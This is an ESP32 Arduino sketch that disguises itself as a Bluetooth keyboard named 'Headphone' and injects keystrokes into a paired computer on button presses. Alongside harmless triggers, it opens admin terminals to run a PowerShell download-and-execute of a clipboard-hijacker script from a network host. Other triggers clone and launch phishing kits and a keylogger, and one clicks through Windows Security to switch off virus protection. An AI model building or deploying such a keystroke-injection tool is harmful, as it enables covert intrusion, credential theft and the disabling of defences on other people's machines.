// This program created by Sachin Kumar Pandey
// ESP32 BLE HID
#include <BleKeyboard.h>

#define BUTTON_1_PIN 16 // Trigger 1
#define BUTTON_2_PIN 17 // Trigger 2
#define BUTTON_3_PIN 18 // Trigger 3
#define BUTTON_4_PIN 19 // Trigger 4
#define BUTTON_5_PIN 21 // Trigger 5
#define BUTTON_6_PIN 15 // Trigger 6
#define BUTTON_7_PIN 13 // Trigger 7
#define BUTTON_8_PIN 12 // Trigger 8
#define BUTTON_9_PIN 14 // Trigger 9
#define BUTTON_10_PIN 23  // Trigger 10
#define BUTTON_11_PIN 24  // Trigger 11
#define BUTTON_12_PIN 26  // Trigger 12
#define BUTTON_13_PIN 28  // Trigger 13
#define BUTTON_14_PIN 25  // Trigger 14
#define BUTTON_15_PIN 22  // Trigger 15
#define BUTTON_16_PIN 11  // Trigger 16
#define BUTTON_17_PIN 27  // Trigger 17
#define BUTTON_18_PIN 20  // Trigger 18
#define BUTTON_19_PIN 29  // Trigger 19
#define BUTTON_20_PIN 30  // Trigger 20

char kbd[] = "Headphone"; // Device Name
BleKeyboard bleKeyboard(kbd, "Espressif", 100);

// last-state trackers
bool lastState1 = HIGH;
bool lastState2 = HIGH;
bool lastState3 = HIGH;
bool lastState4 = HIGH;
bool lastState5 = HIGH;
bool lastState6 = HIGH;
bool lastState7 = HIGH;
bool lastState8 = HIGH;
bool lastState9 = HIGH;
bool lastState10 = HIGH;
bool lastState11 = HIGH;
bool lastState12 = HIGH;
bool lastState13 = HIGH;
bool lastState14 = HIGH;
bool lastState15 = HIGH;
bool lastState16 = HIGH;
bool lastState17 = HIGH;
bool lastState18 = HIGH;
bool lastState19 = HIGH;
bool lastState20 = HIGH;

// helper to type a string char-by-char
void sendString(const char* s, int charDelay = 10) {
  for (size_t i = 0; i < strlen(s); i++) {
    bleKeyboard.print(s[i]);
    delay(charDelay);
  }
}

// Helper: slow typing function
void sendStringSlow(const char *s, unsigned long charDelayMs = 120) {
  for (size_t i = 0; s[i] != '\0'; ++i) {
    bleKeyboard.print(s[i]);   // send single character
    delay(charDelayMs);        // wait so the host processes each char
  }
}

void openRun() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(300);
}

void setup() {
  Serial.begin(115200);

  pinMode(BUTTON_1_PIN, INPUT_PULLUP);
  pinMode(BUTTON_2_PIN, INPUT_PULLUP);
  pinMode(BUTTON_3_PIN, INPUT_PULLUP);
  pinMode(BUTTON_4_PIN, INPUT_PULLUP);
  pinMode(BUTTON_5_PIN, INPUT_PULLUP);
  pinMode(BUTTON_6_PIN, INPUT_PULLUP);
  pinMode(BUTTON_7_PIN, INPUT_PULLUP);
  pinMode(BUTTON_8_PIN, INPUT_PULLUP);
  pinMode(BUTTON_9_PIN, INPUT_PULLUP);
  pinMode(BUTTON_10_PIN, INPUT_PULLUP);
  pinMode(BUTTON_11_PIN, INPUT_PULLUP);
  pinMode(BUTTON_12_PIN, INPUT_PULLUP);
  pinMode(BUTTON_13_PIN, INPUT_PULLUP);
  pinMode(BUTTON_14_PIN, INPUT_PULLUP);
  pinMode(BUTTON_15_PIN, INPUT_PULLUP);
  pinMode(BUTTON_16_PIN, INPUT_PULLUP);
  pinMode(BUTTON_17_PIN, INPUT_PULLUP);
  pinMode(BUTTON_18_PIN, INPUT_PULLUP);
  pinMode(BUTTON_19_PIN, INPUT_PULLUP);
  pinMode(BUTTON_20_PIN, INPUT_PULLUP);

  bleKeyboard.begin();
}

void loop() {
  if (bleKeyboard.isConnected()) {
    bool state1 = digitalRead(BUTTON_1_PIN);
    bool state2 = digitalRead(BUTTON_2_PIN);
    bool state3 = digitalRead(BUTTON_3_PIN);
    bool state4 = digitalRead(BUTTON_4_PIN);
    bool state5 = digitalRead(BUTTON_5_PIN);
    bool state6 = digitalRead(BUTTON_6_PIN);
    bool state7 = digitalRead(BUTTON_7_PIN);
    bool state8 = digitalRead(BUTTON_8_PIN);
    bool state9 = digitalRead(BUTTON_9_PIN);
    bool state10 = digitalRead(BUTTON_10_PIN);
    bool state11 = digitalRead(BUTTON_11_PIN);
    bool state12 = digitalRead(BUTTON_12_PIN);
    bool state13 = digitalRead(BUTTON_13_PIN);
    bool state14 = digitalRead(BUTTON_14_PIN);
    bool state15 = digitalRead(BUTTON_15_PIN);
    bool state16 = digitalRead(BUTTON_16_PIN);
    bool state17 = digitalRead(BUTTON_17_PIN);
    bool state18 = digitalRead(BUTTON_18_PIN);
    bool state19 = digitalRead(BUTTON_19_PIN);
    bool state20 = digitalRead(BUTTON_20_PIN);

    // Trigger 1:
    if (lastState1 == HIGH && state1 == LOW) {
      Serial.println("Trigger 1 is running");
      openRun();
      delay(700);
      sendString("notepad");
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(800);

      const char* txt = "Hello From ESP32 - This program created by Sachin Kumar Pandey";
      sendString(txt, 50);
      delay(200);
    }

    // Trigger 2:
    if (lastState2 == HIGH && state2 == LOW) {
      openRun();
      delay(500);
      sendString("wt"); // looks like you intended Windows Terminal ("wt")
      delay(100);
      // Ctrl+Shift+Enter to run as admin (may show UAC)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);

      // navigate and run; your original sequence used LEFT_ARROW etc.
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);

      const char* cmd = "color 2 & curl parrot.live";
      sendString(cmd, 50);
      delay(500);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 3:
    if (lastState3 == HIGH && state3 == LOW) {
      openRun();
      delay(700);
      const char* url = "https://sachinpandey7709.github.io/Resume-Design/";
      sendString(url, 10);
      delay(300);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 4:
    if (lastState4 == HIGH && state4 == LOW) {
      openRun();
      delay(300);
      const char* cmd = "cmd";
      sendString(cmd, 10);
      delay(200);
      bleKeyboard.press(KEY_RETURN);
      delay(300);
      bleKeyboard.releaseAll();
      delay(700);

      const char* action = "ipconfig /all";
      sendString(action, 10);
      delay(200);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 5:
    if (lastState5 == HIGH && state5 == LOW) {
      openRun();
      delay(500);

      const char* url = "https://github.com/sachinpandey7709";
      sendString(url, 10);
      delay(300);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 6:
    if (lastState6 == HIGH && state6 == LOW) {
      openRun();
      delay(400);
      sendString("cmd", 10);
      delay(150);
      bleKeyboard.press(KEY_RETURN);
      delay(300);
      bleKeyboard.releaseAll();
      delay(700);
      sendString("color a", 10); // foreground bright green
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(200);
      bleKeyboard.releaseAll();
      delay(700);

      sendString("color 1", 10); // foreground blue
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(200);
      bleKeyboard.releaseAll();
      delay(700);

      sendString("color 2", 10); // foreground green
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(200);
      bleKeyboard.releaseAll();
      delay(700);

      // exit cmd
      sendString("exit", 10);
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(500);
    }

    // Trigger 7:
    if (lastState7 == HIGH && state7 == LOW) {
      openRun();
      delay(500);
      sendString("wt"); // looks like you intended Windows Terminal ("wt")
      delay(100);
      // Ctrl+Shift+Enter to run as admin (may show UAC)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);

      // navigate and run; your original sequence used LEFT_ARROW etc.
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);

      const char* cmd = "color 2 & curl ascii.live/forrest";
      sendString(cmd, 50);
      delay(500);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 8:
    if (lastState8 == HIGH && state8 == LOW) {
      openRun();
      delay(500);
      sendString("wt"); // looks like you intended Windows Terminal ("wt")
      delay(100);
      // Ctrl+Shift+Enter to run as admin (may show UAC)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);

      // navigate and run; your original sequence used LEFT_ARROW etc.
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);

      const char* cmd = "color 2 & curl ascii.live/donut";
      sendString(cmd, 50);
      delay(500);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 9
    if (lastState9 == HIGH && state9 == LOW) {
      if (bleKeyboard.isConnected()) {
        // Open Run dialog (Win + R)
        bleKeyboard.press(KEY_LEFT_GUI);
        bleKeyboard.press('r');
        delay(100);
        bleKeyboard.releaseAll();
        delay(1000);

        // Launch Notepad
        const char* cmd = "notepad";
        for (int i = 0; i < strlen(cmd); i++) {
          bleKeyboard.print(cmd[i]);
          delay(10);
        }
        delay(500);
        bleKeyboard.press(KEY_RETURN);
        delay(100);
        bleKeyboard.releaseAll();
        delay(900); // wait for Notepad to open

        const char* txt = "You are hacked by black hat hackers. You are in my control.";
        for (int i = 0; i < strlen(txt); i++) {
          bleKeyboard.print(txt[i]);
          delay(12);
        }
        delay(300);

        // Open File menu (Alt + F)
        bleKeyboard.press(KEY_LEFT_ALT);
        bleKeyboard.press('f');
        delay(100);
        bleKeyboard.releaseAll();
        
        // Wait 300 ms then press 'x' (File -> Exit)
        delay(300);
        bleKeyboard.press('x');
        delay(100);
        bleKeyboard.releaseAll();
      }
    }

    // Trigger 10:
      if (lastState10 == HIGH && state10 == LOW) {
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
      bleKeyboard.print("wt");
      delay(100);
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(3000);
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(5000);
      const char* cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.53:8081/clipboardhijacker.ps1')";
      for (int i=0; i < strlen(cmd); i++) {
      bleKeyboard.print(cmd[i]);
      delay(50);
      }
      delay(1000);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
      }
    // Trigger 11
    if (lastState11 == HIGH && state11 == LOW) {
      openRun();
      delay(700);
      const char* url = "https://youtube.com/@sachinautocad954?si=BuLuBVeXN-xsGonl";
      sendString(url, 10);
      delay(300);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 12
    if (lastState12 == HIGH && state12 == LOW) {
      openRun();
      delay(500);
      sendString("chrome");
      delay(100);
      
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(120);
      bleKeyboard.releaseAll();
      delay(3000);

      
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(2000);

      const char* url = "https://sachinpandey7709.github.io/Resume-Design/";
      sendString(url, 10);
      delay(300);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);
    }

    // Trigger 13:
    if (lastState13 == HIGH && state13 == LOW) {
      Serial.println("Trigger 13: clone repo and run script (slow typing)");

      // Open terminal (Ctrl+Alt+T)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('t');
      delay(120);
      bleKeyboard.releaseAll();
      delay(700); // let terminal open

      // Git clone (type slowly)
      sendStringSlow("git clone https://github.com/techchipnet/CamPhish", 150);
      bleKeyboard.press(KEY_RETURN);
      delay(6000); // wait for clone to complete (increase if slow internet)

      // cd into folder
      sendStringSlow("cd CamPhish", 130);
      bleKeyboard.press(KEY_RETURN);
      delay(800);

      // run script
      sendStringSlow("bash camphish.sh", 130);
      bleKeyboard.press(KEY_RETURN);
      delay(1000);
    }

    // Trigger 14:
    if (lastState14 == HIGH && state14 == LOW) {
      Serial.println("Trigger 14: clone repo and run script (slow typing)");

      // Open terminal (Ctrl+Alt+T)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('t');
      delay(120);
      bleKeyboard.releaseAll();
      delay(700); // let terminal open

      // Git clone (type slowly)
      sendStringSlow("git clone --depth=1 https://github.com/htr-tech/zphisher.git", 160);
      bleKeyboard.press(KEY_RETURN);
      delay(6000); // wait for clone to complete (increase if slow internet)

      // cd into folder
      sendStringSlow("cd zphisher", 130);
      bleKeyboard.press(KEY_RETURN);
      delay(800);

      // run script
      sendStringSlow("bash zphisher.sh", 130);
      bleKeyboard.press(KEY_RETURN);
      delay(1000);
    }

    // Trigger 15:
    if (lastState15 == HIGH && state15 == LOW) {
      Serial.println("Trigger 15: clone repo and run script (slow typing)");

      // Open terminal (Ctrl+Alt+T)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('t');
      delay(120);
      bleKeyboard.releaseAll();
      delay(700); // let terminal open

      // Git clone (type slowly)
      sendStringSlow("git clone https://github.com/techchipnet/hound", 160);
      bleKeyboard.press(KEY_RETURN);
      delay(6000); // wait for clone to complete (increase if slow internet)

      // cd into folder
      sendStringSlow("cd hound", 150);
      bleKeyboard.press(KEY_RETURN);
      delay(800);

      // run script
      sendStringSlow("bash hound.sh", 150);
      bleKeyboard.press(KEY_RETURN);
      delay(1000);
    }

    // Trigger 16:
    if (lastState16 == HIGH && state16 == LOW) {
      Serial.println("Trigger 16: clone repo and run script (slow typing)");

      // Open terminal (Ctrl+Alt+T)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('t');
      delay(120);
      bleKeyboard.releaseAll();
      delay(700); // let terminal open

      // Git clone (type slowly)
      sendStringSlow("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 180);
      bleKeyboard.press(KEY_RETURN);
      delay(6000); // wait for clone to complete (increase if slow internet)

      // cd into folder
      sendStringSlow("cd File-Encryption-Awareness-Project-Ethical-Demo-", 160);
      bleKeyboard.press(KEY_RETURN);
      delay(800);

      // run script
      sendStringSlow("python3 code.py", 150);
      bleKeyboard.press(KEY_RETURN);
      delay(1000);
    }

    // Trigger 17:
    if (lastState17 == HIGH && state17 == LOW) {
      Serial.println("Trigger 17: clone repo and run script (slow typing)");

      // Open terminal (Ctrl+Alt+T)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('t');
      delay(120);
      bleKeyboard.releaseAll();
      delay(700); // let terminal open

      // Git clone (type slowly)
      sendStringSlow("git clone https://github.com/sachinpandey7709/Keylogger.git", 140);
      bleKeyboard.press(KEY_RETURN);
      delay(6000); // wait for clone to complete (increase if slow internet)

      // cd into folder
      sendStringSlow("cd Keylogger", 120);
      bleKeyboard.press(KEY_RETURN);
      delay(800);

      // run script
      sendStringSlow("python3 keylogger.py", 120);
      bleKeyboard.press(KEY_RETURN);
      delay(1000);
    }

    // Trigger 18:
    if (lastState18 == HIGH && state18 == LOW) {
      Serial.println("Trigger 18: clone repo and run script");

      // Open start / Windows menu
      bleKeyboard.press(KEY_LEFT_GUI);
      delay(100);
      bleKeyboard.releaseAll();
      delay(500);

      // type "virus & threat protection"
      bleKeyboard.print("virus & threat protection");
      delay(7000);
      bleKeyboard.releaseAll();

      // press TAB 4 times
      for (int i = 0; i < 4; ++i) {
        bleKeyboard.press(KEY_TAB);
        delay(100);
        bleKeyboard.releaseAll();
        delay(700);
      }

      // press ENTER
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(1000);

      // === Press SPACE ===
      bleKeyboard.press(' ');
      delay(100);
      bleKeyboard.release(' '); 
      delay(2000);

      // move left, then press enter
      bleKeyboard.press(KEY_LEFT_ARROW);
      delay(100);
      bleKeyboard.releaseAll();
      delay(100);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(5000);
      }

      // Trigger 19:
    if (lastState19 == HIGH && state19 == LOW) {
      Serial.println("Trigger 19: clone repo and run script (slow typing)");

      // Open terminal (Ctrl+Alt+T)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('t');
      delay(120);
      bleKeyboard.releaseAll();
      delay(700); // let terminal open

      // Git clone (type slowly)
      sendStringSlow("git clone https://github.com/sachinpandey7709/Secret-Messaging.git", 180);
      bleKeyboard.press(KEY_RETURN);
      delay(6000); // wait for clone to complete (increase if slow internet)

      // cd into folder
      sendStringSlow("cd Secret-Messaging", 150);
      bleKeyboard.press(KEY_RETURN);
      delay(800);

      // run script
      sendStringSlow("python3 code2.py", 140);
      bleKeyboard.press(KEY_RETURN);
      delay(1000);
    }

    // Trigger 20:
    if (lastState20 == HIGH && state20 == LOW) {
      Serial.println("Trigger 20: clone repo and run script (slow typing)");

      // Open terminal (Ctrl+Alt+T)
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('t');
      delay(120);
      bleKeyboard.releaseAll();
      delay(700); // let terminal open

      // Git clone (type slowly)
      sendStringSlow("git clone https://github.com/sachinpandey7709/Password-Manager.git", 180);
      bleKeyboard.press(KEY_RETURN);
      delay(6000); // wait for clone to complete (increase if slow internet)

      // cd into folder
      sendStringSlow("cd Password-Manager", 150);
      bleKeyboard.press(KEY_RETURN);
      delay(800);

      // run script
      sendStringSlow("python3 password.py", 150);
      bleKeyboard.press(KEY_RETURN);
      delay(1000);
    }


    // update last states
    lastState1 = state1;
    lastState2 = state2;
    lastState3 = state3;
    lastState4 = state4;
    lastState5 = state5;
    lastState6 = state6;
    lastState7 = state7;
    lastState8 = state8;
    lastState9 = state9;
    lastState10 = state10;
    lastState11 = state11;
    lastState12 = state12;
    lastState13 = state13;
    lastState14 = state14;
    lastState15 = state15;
    lastState16 = state16;
    lastState17 = state17;
    lastState18 = state18;
    lastState19 = state19;
    lastState20 = state20;
  }

  delay(10); // Small debounce
}
